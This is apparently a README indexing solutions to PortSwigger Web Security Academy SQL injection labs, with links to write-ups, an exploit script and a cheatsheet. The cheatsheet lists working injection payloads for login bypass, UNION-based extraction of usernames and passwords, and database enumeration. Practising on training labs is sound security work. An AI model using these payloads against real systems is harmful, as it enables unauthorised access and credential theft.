# SQL Injection - PortSwigger Web Security Academy

Complete solutions and exploits for all SQL Injection labs.

## Labs

### Apprentice
1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](01-retrieve-hidden-data.md)
2. [SQL injection vulnerability allowing login bypass](02-login-bypass.md)

### Practitioner - UNION attacks
3. [SQL injection UNION attack, determining the number of columns](07-union-determine-columns.md)
4. [SQL injection UNION attack, finding a column containing text](08-union-find-text-column.md)
5. [SQL injection UNION attack, retrieving data from other tables](09-union-retrieve-data.md)
6. [SQL injection UNION attack, retrieving multiple values in a single column](10-union-multiple-values.md)

### Practitioner - Examining the database
7. [SQL injection attack, querying the database type and version on Oracle](03-version-oracle.md)
8. [SQL injection attack, querying the database type and version on MySQL and Microsoft](04-version-mysql-microsoft.md)
9. [SQL injection attack, listing the database contents on non-Oracle databases](05-list-contents-non-oracle.md)
10. [SQL injection attack, listing the database contents on Oracle](06-list-contents-oracle.md)

### Practitioner - Blind SQL injection
11. [Blind SQL injection with conditional responses](11-blind-conditional-responses.md)
12. [Blind SQL injection with conditional errors](12-blind-conditional-errors.md)
13. [Visible error-based SQL injection](13-visible-error-based.md)
14. [Blind SQL injection with time delays](14-blind-time-delays.md)
15. [Blind SQL injection with time delays and information retrieval](15-blind-time-info-retrieval.md)
16. [Blind SQL injection with out-of-band interaction](16-blind-oob-interaction.md)
17. [Blind SQL injection with out-of-band data exfiltration](17-blind-oob-exfiltration.md)

### Practitioner - Other
18. [SQL injection with filter bypass via XML encoding](18-filter-bypass-xml.md)

## Scripts

- [`sql_injection_allowing_login_bypass.py`](sql_injection_allowing_login_bypass.py) — automated exploit for the login bypass lab (lab 02).

## Quick Payloads Cheatsheet

| Lab | Payload |
|-----|--------|
| 01 Hidden data | `'+OR+1=1--` |
| 02 Login bypass | `administrator'--` |
| 03 UNION columns | `' UNION SELECT NULL,NULL,NULL--` |
| 04 UNION text | `' UNION SELECT 'a','b'--` |
| 05 UNION data | `' UNION SELECT username, password FROM users--` |
| 06 UNION concat | `' UNION SELECT NULL, username || ':' || password FROM users--` |
| 07 Version Oracle | `' UNION SELECT BANNER, NULL FROM v$version--` |
| 08 Version MySQL | `' UNION SELECT @@version, NULL--` |
| 09 List non-Oracle | `' UNION SELECT table_name, NULL FROM information_schema.tables--` |
| 10 List Oracle | `' UNION SELECT table_name, NULL FROM all_tables--` |
